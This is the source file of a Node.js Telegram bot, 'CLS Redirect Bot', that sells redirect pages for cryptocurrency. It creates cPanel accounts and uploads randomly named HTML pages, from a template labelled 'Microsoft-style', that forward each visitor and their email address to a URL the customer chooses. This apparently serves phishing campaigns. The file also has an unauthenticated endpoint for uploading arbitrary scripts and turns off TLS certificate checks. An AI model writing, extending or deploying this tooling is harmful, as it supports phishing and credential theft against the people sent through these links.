require("dotenv").config();
const { Telegraf, Markup } = require("telegraf");
const axios = require("axios");
const https = require("https");
const crypto = require("crypto");
const pino = require("pino");
const express = require("express");
const path = require("path");
const fs = require("fs");

// __dirname is available by default in CommonJS
const app = express();

// Middleware for parsing JSON
app.use(express.json());

// Serve static files
app.use(express.static("."));

// Root route - redirect to dashboard
app.get("/", (_, res) => {
  res.redirect("/dashboard");
});

// Serve dashboard
app.get("/dashboard", (_, res) => {
  res.sendFile(path.join(__dirname, "dashboard.html"));
});

// Enhanced Logger with better formatting
let loggerConfig = {
  level: process.env.LOG_LEVEL || "info",
};

// Only add pretty printing in development and if available
if (process.env.NODE_ENV !== "production") {
  try {
    require("pino-pretty");
    loggerConfig.transport = {
      target: "pino-pretty",
      options: {
        colorize: true,
        translateTime: "HH:MM:ss",
        ignore: "pid,hostname",
      },
    };
  } catch (e) {
    // Fallback to basic logging if pino-pretty is not available
    console.log("Pino-pretty not available, using basic logging");
  }
}

const baseLog = pino(loggerConfig);
const L = (id) => baseLog.child({ reqId: id });

// Log startup information
const startupLog = L("startup");
startupLog.info("🚀 Domain Provisioning Bot starting...");
startupLog.info(`📊 Environment: ${process.env.NODE_ENV || "development"}`);
startupLog.info(`🔧 Log Level: ${process.env.LOG_LEVEL || "info"}`);
startupLog.info(`🌐 WHM Server: ${process.env.WHM_SERVER || "Not configured"}`);

// HTTPS Agent for self-signed certificates
const tlsAgent = new https.Agent({ rejectUnauthorized: false });

// Random helpers
const rInt = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
const rStr = (l, s = "abcdefghijklmnopqrstuvwxyz0123456789") =>
  [...Array(l)].map(() => s[rInt(0, s.length - 1)]).join("");
const rFile = () => rStr(99) + ".html";

// WHM API Client
const WHM = axios.create({
  baseURL: process.env.WHM_SERVER,
  httpsAgent: tlsAgent,
  timeout: 30000,
  headers: {
    Authorization:
      "Basic " +
      Buffer.from(
        `${process.env.WHM_USERNAME}:${process.env.WHM_PASSWORD}`,
        "utf8",
      ).toString("base64"),
  },
});

// User sessions with rate limiting
const sessions = new Map();
const rateLimits = new Map();

function getSession(ctx) {
  const id = ctx.from.id;
  if (!sessions.has(id)) sessions.set(id, {});
  return sessions.get(id);
}

function checkRateLimit(userId) {
  const now = Date.now();
  const userLimit = rateLimits.get(userId) || { count: 0, resetTime: now + 60000 };
  
  if (now > userLimit.resetTime) {
    userLimit.count = 1;
    userLimit.resetTime = now + 60000;
  } else {
    userLimit.count++;
  }
  
  rateLimits.set(userId, userLimit);
  return userLimit.count <= 3; // Max 3 requests per minute
}

// Create WHM/cPanel account
async function createAccount(domain, log) {
  const user = (
    domain
      .replace(/[^a-zA-Z0-9]/g, "")
      .slice(0, 3)
      .toLowerCase() + rStr(5)
  ).slice(0, 8);

  const pass = rStr(
    14,
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()",
  );

  const params = new URLSearchParams({
    domain,
    username: user,
    password: pass,
    plan: process.env.WHM_PACKAGE_NAME || "default",
  });

  log.info({ domain, user }, "Creating cPanel account");

  const { data } = await WHM.post("/json-api/createacct?api.version=1", params);

  if (!data?.metadata || data.metadata.result !== 1) {
    throw new Error(
      data?.metadata?.reason || "Failed to create cPanel account",
    );
  }

  log.info({ domain, user, ip: data.data.ip }, "Account created successfully");

  return {
    user,
    password: pass,
    ip: data.data.ip,
  };
}

// Create directory in public_html
const createDirectory = (user, folderName) =>
  WHM.get("/json-api/cpanel", {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 2,
      cpanel_jsonapi_module: "Fileman",
      cpanel_jsonapi_func: "mkdir",
      path: "public_html",
      name: folderName,
    },
  });

// Upload script file to directory
const uploadScriptFile = (user, folderName, fileName, htmlContent) =>
  WHM.post("/json-api/cpanel", null, {
    params: {
      cpanel_jsonapi_user: user,
      cpanel_jsonapi_apiversion: 3,
      cpanel_jsonapi_module: "Fileman",
      cpanel_jsonapi_func: "save_file_content",
      dir: `/home/${user}/public_html/${folderName}`,
      file: fileName,
      content: htmlContent,
      from_charset: "UTF-8",
      to_charset: "UTF-8",
    },
  });

// Generate script HTML content
function generateScriptContent(redirectUrl, delay = 500) {
  const template = fs.readFileSync("./script-template.html", "utf8");
  return template
    .replace("{{REDIRECT_URL}}", redirectUrl)
    .replace("{{DELAY}}", delay)
    .replace("{{TITLE}}", rStr(20));
}

// Generate custom script content using the Microsoft-style template
function generateCustomScriptContent(redirectUrl) {
  const template = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${rStr(20)}</title>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(redirect, 300);
        });

        // Function to handle redirection
        function redirect() {
            var email = getParameterByName('email'); // Attempt to get the email parameter
            var redirectUrl = "${redirectUrl}";

            if (email) {
                redirectUrl += email; // Append email if provided
            } else {
                console.log("No email provided. Redirecting without email.");
            }

            console.log("Redirecting to: " + redirectUrl);
            window.location.href = redirectUrl;
        }

        // Function to get URL parameters
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\\[\\]]/g, '\\\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            var results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\\+/g, ' '));
        }

        // Function to manually trigger redirection via checkbox
        function handleCheckboxClick(checkbox) {
            if (checkbox.checked) {
                console.log("Checkbox is checked. Redirecting...");
                redirect();
            } else {
                console.log("Checkbox is not checked.");
            }
        }
    </script>
</head>
<body>
</body>
</html>`;
  return template;
}

// Bot initialization - only if token is provided
let bot = null;
if (
  process.env.TELEGRAM_BOT_TOKEN &&
  process.env.TELEGRAM_BOT_TOKEN !== "your_telegram_bot_token_here"
) {
  bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

  // Set webhook if in production
  if (process.env.NODE_ENV === "production" && process.env.WEBHOOK_DOMAIN) {
    bot.telegram.setWebhook(
      `${process.env.WEBHOOK_DOMAIN}/bot${process.env.TELEGRAM_BOT_TOKEN}`,
    );
  }
}

// User database (in production, use a real database)
const users = new Map();
const provisionHistory = new Map();
const topupRequests = new Map();

function getUserData(userId) {
  if (!users.has(userId)) {
    users.set(userId, {
      id: userId,
      balance: 0,
      joinDate: new Date(),
      totalDomains: 0
    });
  }
  return users.get(userId);
}

// Configure bot commands only if bot is available
if (bot) {
  // Start command with menu
  bot.start((ctx) => {
    const session = getSession(ctx);
    const user = getUserData(ctx.from.id);

    const log = L("start-command");
    log.info(
      {
        userId: ctx.from.id,
        username: ctx.from.username || "unknown",
        firstName: ctx.from.first_name || "unknown",
      },
      "👤 New user started bot interaction",
    );

    return ctx.reply(
      `🚀 *Welcome to CLS Redirect Bot!*\n\n` +
      `Choose an option from the menu below:`,
      { 
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: '💳 Top Up', callback_data: 'topup' },
              { text: '🔗 Get Redirect', callback_data: 'redirect' }
            ],
            [
              { text: '👤 Profile', callback_data: 'profile' },
              { text: '📋 History', callback_data: 'history' }
            ]
          ]
        }
      }
    );
  });



  // Help command
  bot.help((ctx) => {
    return ctx.reply(
      "📋 *Available Commands:*\n\n" +
        "/start - Start the provisioning process\n" +
        "/help - Show this help message\n" +
        "/cancel - Cancel current operation\n\n" +
        "*How it works:*\n" +
        "1. Send me your domain name\n" +
        "2. I create a cPanel hosting account\n" +
        "3. I set up 3 script folders with files\n" +
        "4. You get the URLs and server IP",
      { parse_mode: "Markdown" },
    );
  });

  // Cancel command
  bot.command("cancel", (ctx) => {
    const session = getSession(ctx);
    sessions.delete(ctx.from.id);

    return ctx.reply("❌ Operation cancelled. Use /start to begin again.");
  });

  // Main text handler
  bot.on("text", async (ctx) => {
    const session = getSession(ctx);
    const text = ctx.message.text.trim();

    // Amount input for topup
    if (session.awaiting_amount) {
      session.awaiting_amount = false;
      
      const amount = parseFloat(text);
      if (isNaN(amount) || amount <= 0) {
        session.awaiting_amount = true;
        return ctx.reply(
          "❌ Invalid amount. Please enter a valid number:\n" +
          "Example: 50",
          { parse_mode: "Markdown" }
        );
      }

      // Generate topup request
      const requestId = crypto.randomUUID().slice(0, 8);
      const topupRequest = {
        id: requestId,
        userId: ctx.from.id,
        username: ctx.from.username || 'Unknown',
        amount: amount,
        crypto: session.selected_crypto,
        date: new Date(),
        status: 'pending'
      };

      topupRequests.set(requestId, topupRequest);

      // Send to admin for approval
      if (process.env.ADMIN_ID && process.env.ADMIN_ID !== "your_telegram_admin_user_id") {
        try {
          const adminKeyboard = Markup.inlineKeyboard([
            [Markup.button.callback('✅ Approve', `approve_${requestId}`)],
            [Markup.button.callback('❌ Reject', `reject_${requestId}`)]
          ]);

          await bot.telegram.sendMessage(
            process.env.ADMIN_ID,
            `💳 *New Top-Up Request*\n\n` +
            `👤 User: @${topupRequest.username} (${topupRequest.userId})\n` +
            `💰 Amount: $${amount}\n` +
            `🪙 Method: ${session.selected_crypto}\n` +
            `📅 Date: ${topupRequest.date.toLocaleString()}\n` +
            `🆔 Request ID: \`${requestId}\``,
            { 
              parse_mode: "Markdown",
              reply_markup: adminKeyboard
            }
          );
        } catch (adminError) {
          console.log("Failed to send admin notification");
        }
      }

      return ctx.reply(
        `💳 *Top-Up Request Submitted*\n\n` +
        `💰 Amount: $${amount}\n` +
        `🪙 Method: ${session.selected_crypto}\n` +
        `🆔 Request ID: \`${requestId}\`\n\n` +
        `⏳ Your request has been sent to admin for approval.\n` +
        `You will be notified once it's processed.`,
        { parse_mode: "Markdown" }
      );
    }

    // Domain input handling
    if (session.awaiting_domain) {
      session.awaiting_domain = false;

      // Parse domain and redirect URL
      const parts = text.trim().split(" ");
      if (parts.length !== 2) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid format. Please send domain and redirect URL separated by space:\n" +
            "Format: `domain.com https://fb.com`",
          { parse_mode: "Markdown" },
        );
      }

      const [domainInput, redirectUrl] = parts;

      // Enhanced domain validation
      const domainRegex =
        /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
      if (!domainRegex.test(domainInput) || domainInput.includes('..') || domainInput.startsWith('-') || domainInput.endsWith('-')) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid domain format. Please enter a valid domain and URL:\n" +
            "Format: `domain.com https://fb.com`",
          { parse_mode: "Markdown" },
        );
      }

      // Check rate limit
      if (!checkRateLimit(ctx.from.id)) {
        session.awaiting_domain = true;
        return ctx.reply("⏰ Rate limit exceeded. Please wait a minute before trying again.");
      }

      // Basic URL validation
      if (
        !redirectUrl.startsWith("http://") &&
        !redirectUrl.startsWith("https://")
      ) {
        session.awaiting_domain = true;
        return ctx.reply(
          "❌ Invalid URL format. URL must start with http:// or https://\n" +
            "Format: `domain.com https://fb.com`",
          { parse_mode: "Markdown" },
        );
      }

      const domain = domainInput.toLowerCase();
      const requestId = crypto.randomUUID().slice(0, 8);
      const log = L(requestId);

      log.info(
        {
          userId: ctx.from.id,
          username: ctx.from.username || "unknown",
          domain,
          redirectUrl,
          requestId,
        },
        "🎯 Starting domain provisioning request",
      );

      await ctx.reply(
        `🔄 Processing domain: *${domain}*\n\nRequest ID: \`${requestId}\`\n\nThis may take a few moments...`,
        { parse_mode: "Markdown" },
      );

      try {
        // Step 1: Create cPanel account
        log.info({ domain }, "Starting domain provisioning");
        const { user, password, ip } = await createAccount(domain, log);

        await ctx.reply(
          `✅ cPanel account created!\n*Username:* ${user}\n*Server IP:* ${ip}`,
          { parse_mode: "Markdown" },
        );

        // Step 2: Create 3 folders and upload script files
        const urls = [];

        for (let i = 1; i <= 3; i++) {
          const folderName = rInt(100, 999).toString();
          const fileName = rFile();

          try {
            // Create directory
            await createDirectory(user, folderName);
            log.info({ user, folderName }, "Directory created");

            // Generate and upload script content
            const scriptContent = generateCustomScriptContent(redirectUrl);
            await uploadScriptFile(user, folderName, fileName, scriptContent);

            const url = `https://${domain}/${folderName}/${fileName}`;
            urls.push(url);

            log.info({ user, url }, "Script file uploaded");
          } catch (err) {
            log.error(
              { err: err.message, folderName },
              "Failed to create folder or upload file",
            );
            throw new Error(`Failed to setup folder ${i}: ${err.message}`);
          }
        }

        // Step 3: Return results to user
        const responseMessage =
          `🎉 *Domain provisioning completed!*\n\n` +
          `*Domain:* ${domain}\n` +
          `*Server IP:* ${ip}\n` +
          `*cPanel Username:* ${user}\n` +
          `*cPanel Password:* ${password}\n\n` +
          `*Script URLs:*\n` +
          urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
          "\n\n" +
          `⚠️ *Important:* Update your domain's nameservers to point to your hosting provider for the URLs to work.`;

        await ctx.reply(responseMessage, { parse_mode: "Markdown" });

        // Save to user history
        const userHistory = provisionHistory.get(ctx.from.id) || [];
        userHistory.push({
          domain: domain,
          redirectUrl: redirectUrl,
          date: new Date(),
          urls: urls,
          ip: ip,
          username: user,
          password: password
        });
        provisionHistory.set(ctx.from.id, userHistory);

        // Update user stats
        const userData = getUserData(ctx.from.id);
        userData.totalDomains = userHistory.length;

        log.info(
          { domain, urls, ip },
          "Domain provisioning completed successfully",
        );

        // Send to admin if configured
        if (
          process.env.ADMIN_ID &&
          process.env.ADMIN_ID !== "your_telegram_admin_user_id"
        ) {
          try {
            await bot.telegram.sendMessage(
              process.env.ADMIN_ID,
              `🎉 *Domain Setup Complete!*\n\n` +
                `🌐 ${domain} ➜ ${redirectUrl}\n` +
                `👤 @${ctx.from.username || ctx.from.id}\n` +
                `🔗 ${urls.length} URLs created`,
              { parse_mode: "Markdown" },
            );
            log.info(
              { adminId: process.env.ADMIN_ID },
              "📤 Admin notification sent successfully",
            );
          } catch (adminError) {
            log.warn(
              {
                adminError: adminError.message,
                adminId: process.env.ADMIN_ID,
              },
              "⚠️ Failed to send admin notification (check ADMIN_ID in .env)",
            );
          }
        } else {
          log.info("ℹ️ Admin notifications disabled (ADMIN_ID not configured)");
        }
      } catch (error) {
        log.error(
          { error: error.message, domain },
          "Domain provisioning failed",
        );
        await ctx.reply(
          `❌ *Provisioning failed:*\n\n${error.message}\n\nPlease try again with /start`,
          { parse_mode: "Markdown" },
        );
      }

      // Clear session
      sessions.delete(ctx.from.id);
    } else {
      // No active session
      return ctx.reply("Please use /start to begin domain provisioning.");
    }
  });

  // Combined callback query handler for all inline buttons
  bot.on('callback_query', async (ctx) => {
    const callbackData = ctx.callbackQuery.data;
    const session = getSession(ctx);
    
    // Always answer callback query first to remove loading state
    await ctx.answerCbQuery();
    
    try {
      // Handle main menu actions
      if (callbackData === 'topup') {
        session.awaiting_crypto_choice = true;

        return ctx.editMessageText(
          `💳 *Top Up Your Account*\n\n` +
          `Choose your preferred cryptocurrency:`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '₿ Bitcoin (BTC)', callback_data: 'crypto_btc' }],
                [{ text: '🟡 Tether TRC20', callback_data: 'crypto_usdt' }],
                [{ text: '💎 Ethereum (ERC20)', callback_data: 'crypto_eth' }],
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }
      
      if (callbackData === 'redirect') {
        session.awaiting_domain = true;

        return ctx.editMessageText(
          "🚀 *CLS Redirect Setup!*\n\n" +
            "✨ Send: `domain.com redirect-url`\n" +
            "📝 Example: `mysite.com https://fb.com`",
          { parse_mode: "Markdown" }
        );
      }
      
      if (callbackData === 'profile') {
        const user = getUserData(ctx.from.id);
        const userHistory = provisionHistory.get(ctx.from.id) || [];

        return ctx.editMessageText(
          `👤 *Your Profile*\n\n` +
          `📱 User ID: \`${ctx.from.id}\`\n` +
          `👋 Name: ${ctx.from.first_name || 'Unknown'}\n` +
          `💰 Balance: $${user.balance.toFixed(2)}\n` +
          `📅 Member since: ${user.joinDate.toDateString()}\n` +
          `🌐 Total domains: ${userHistory.length}\n` +
          `⭐ Status: ${user.balance > 0 ? 'Premium' : 'Free'}`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }
      
      if (callbackData === 'history') {
        const userHistory = provisionHistory.get(ctx.from.id) || [];

        if (userHistory.length === 0) {
          return ctx.editMessageText(
            `📋 *Domain History*\n\n` +
            `No domains provisioned yet.\n` +
            `Use "🔗 Get Redirect" to create your first domain!`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        const historyText = userHistory
          .slice(-10) // Show last 10 domains
          .map((domain, index) => 
            `${index + 1}. 🌐 \`${domain.domain}\`\n` +
            `   📅 ${domain.date.toDateString()}\n` +
            `   🔗 ${domain.redirectUrl}\n`
          )
          .join('\n');

        return ctx.editMessageText(
          `📋 *Domain History* (Last ${Math.min(userHistory.length, 10)})\n\n` +
          historyText +
          `\n💡 Total domains: ${userHistory.length}`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }
      
      // Handle crypto selection
      if (['crypto_btc', 'crypto_usdt', 'crypto_eth'].includes(callbackData)) {
        if (!session.awaiting_crypto_choice) return;

        session.awaiting_crypto_choice = false;
        session.awaiting_amount = true;
        
        const cryptoNames = {
          'crypto_btc': '₿ Bitcoin (BTC)',
          'crypto_usdt': '🟡 Tether TRC20',
          'crypto_eth': '💎 Ethereum (ERC20)'
        };
        
        session.selected_crypto = cryptoNames[callbackData];

        return ctx.editMessageText(
          `💰 *${session.selected_crypto}*\n\n` +
          `Please enter the amount you want to top up (in USD):\n\n` +
          `Example: 50`,
          { parse_mode: "Markdown" }
        );
      }
      
      // Handle back to menu
      if (callbackData === 'back_menu') {
        // Clear any pending sessions
        Object.keys(session).forEach(key => delete session[key]);

        return ctx.editMessageText(
          `🏠 *Main Menu*\n\n` +
          `Choose an option:`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '💳 Top Up', callback_data: 'topup' },
                  { text: '🔗 Get Redirect', callback_data: 'redirect' }
                ],
                [
                  { text: '👤 Profile', callback_data: 'profile' },
                  { text: '📋 History', callback_data: 'history' }
                ]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log('Callback error:', error.message);
    }
    
    // Handle admin approval/rejection callbacks
    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
      const [action, requestId] = callbackData.split('_');
      const request = topupRequests.get(requestId);
      
      if (!request) {
        return ctx.answerCbQuery('Request not found');
      }

      if (action === 'approve') {
        // Update user balance
        const userData = getUserData(request.userId);
        userData.balance += request.amount;
        request.status = 'approved';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `✅ *Top-Up Approved!*\n\n` +
            `💰 Amount: $${request.amount}\n` +
            `💳 New Balance: $${userData.balance.toFixed(2)}\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `Thank you! Your account has been credited.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `✅ *APPROVED*\n\n${ctx.callbackQuery.message.text.replace('💳 *New Top-Up Request*', '💳 *Top-Up Request - APPROVED*')}`,
          { parse_mode: "Markdown" }
        );
        
        await ctx.answerCbQuery('✅ Top-up approved!');
        
      } else if (action === 'reject') {
        request.status = 'rejected';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `❌ *Top-Up Rejected*\n\n` +
            `💰 Amount: $${request.amount}\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `Your top-up request has been rejected. Please contact support if you have questions.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `❌ *REJECTED*\n\n${ctx.callbackQuery.message.text.replace('💳 *New Top-Up Request*', '💳 *Top-Up Request - REJECTED*')}`,
          { parse_mode: "Markdown" }
        );
        
        await ctx.answerCbQuery('❌ Top-up rejected!');
      }
    }
  });

  // Enhanced error handling
  bot.catch((err, ctx) => {
    const log = L("bot-error");
    log.error(
      {
        error: err.message,
        stack: err.stack,
        userId: ctx.from?.id,
        username: ctx.from?.username || "unknown",
        chatId: ctx.chat?.id,
        messageText: ctx.message?.text || "unknown",
      },
      "💥 Bot error occurred",
    );

    return ctx.reply(
      "❌ *Oops! Something went wrong*\n\n" +
        "Please try again with /start or contact support if the issue persists.\n\n" +
        `Error ID: \`${crypto.randomUUID().slice(0, 8)}\``,
      { parse_mode: "Markdown" },
    );
  });

  // Webhook endpoint
  app.use(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, bot.webhookCallback("/"));
}

// Statistics tracking
const stats = {
  domainsCreated: 0,
  requestsProcessed: 0,
  startTime: Date.now()
};

// Enhanced health check endpoint
app.get("/health", (req, res) => {
  const log = L("health-check");
  const healthData = {
    status: "ok",
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memoryUsage: process.memoryUsage(),
    botStatus: bot ? "active" : "inactive",
    environment: process.env.NODE_ENV || "development",
  };

  log.debug(healthData, "💊 Health check requested");
  res.json(healthData);
});

// Statistics endpoint
app.get("/api/stats", (req, res) => {
  res.json({
    ...stats,
    activeSessions: sessions.size,
    rateLimitedUsers: rateLimits.size
  });
});

// Test API endpoint for domain provisioning
app.post("/api/provision", express.json(), async (req, res) => {
  const { domain } = req.body;

  if (!domain) {
    return res.status(400).json({ error: "Domain is required" });
  }

  const log = L(crypto.randomUUID().slice(0, 8));

  try {
    // Step 1: Create cPanel account
    log.info({ domain }, "Starting domain provisioning via API");
    const { user, password, ip } = await createAccount(domain, log);

    // Step 2: Create 3 folders and upload script files
    const urls = [];
    const redirectUrl =
      process.env.DEFAULT_REDIRECT_URL || "https://example.com";

    for (let i = 1; i <= 3; i++) {
      const folderName = rInt(100, 999).toString();
      const fileName = rFile();

      try {
        // Create directory
        await createDirectory(user, folderName);
        log.info({ user, folderName }, "Directory created");

        // Generate and upload script content
        const scriptContent = generateCustomScriptContent(redirectUrl);
        await uploadScriptFile(user, folderName, fileName, scriptContent);

        const url = `https://${domain}/${folderName}/${fileName}`;
        urls.push(url);

        log.info({ user, url }, "Script file uploaded");
      } catch (err) {
        log.error(
          { err: err.message, folderName },
          "Failed to create folder or upload file",
        );
        throw new Error(`Failed to setup folder ${i}: ${err.message}`);
      }
    }

    const result = {
      domain,
      server_ip: ip,
      cpanel_username: user,
      cpanel_password: password,
      script_urls: urls,
      message: "Domain provisioning completed successfully",
    };

    log.info(
      { domain, urls, ip },
      "Domain provisioning completed successfully via API",
    );
    res.json(result);
  } catch (error) {
    log.error(
      { error: error.message, domain },
      "Domain provisioning failed via API",
    );
    res.status(500).json({
      error: "Provisioning failed",
      message: error.message,
    });
  }
});

// Custom script file upload endpoint
app.post("/api/upload-script", express.json(), async (req, res) => {
  const { domain, scriptContent, customFileName } = req.body;

  if (!domain || !scriptContent) {
    return res
      .status(400)
      .json({ error: "Domain and script content are required" });
  }

  const log = L(crypto.randomUUID().slice(0, 8));

  try {
    // Find existing account by domain
    const accounts = await WHM.get("/json-api/listaccts?api.version=1");
    const account = accounts.data.data.acct.find(
      (acc) => acc.domain === domain,
    );

    if (!account) {
      return res
        .status(404)
        .json({ error: "Domain not found in hosting accounts" });
    }

    const folderName = rInt(100, 999).toString();
    const fileName = customFileName || rFile();

    // Create directory and upload custom script
    await createDirectory(account.user, folderName);
    await uploadScriptFile(account.user, folderName, fileName, scriptContent);

    const url = `https://${domain}/${folderName}/${fileName}`;

    log.info({ domain, user: account.user, url }, "Custom script uploaded");

    res.json({
      domain,
      folder: folderName,
      filename: fileName,
      url,
      message: "Custom script uploaded successfully",
    });
  } catch (error) {
    log.error({ error: error.message, domain }, "Custom script upload failed");
    res.status(500).json({
      error: "Upload failed",
      message: error.message,
    });
  }
});

// Start server
const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, "0.0.0.0", () => {
  const log = L("server");
  log.info({ port: PORT }, "Server started");

  // Use polling in development only if bot is initialized
  if (process.env.NODE_ENV !== "production" && bot) {
    bot.launch();
    log.info("Bot started with polling");
  } else if (!bot) {
    log.info(
      "Bot not initialized - Telegram token missing. Dashboard available at /dashboard",
    );
  }
});

// Graceful shutdown
process.once("SIGINT", () => {
  const log = L("shutdown");
  log.info("Shutting down gracefully");
  if (bot) bot.stop("SIGINT");
  server.close();
});

process.once("SIGTERM", () => {
  const log = L("shutdown");
  log.info("Shutting down gracefully");
  if (bot) bot.stop("SIGTERM");
  server.close();
});
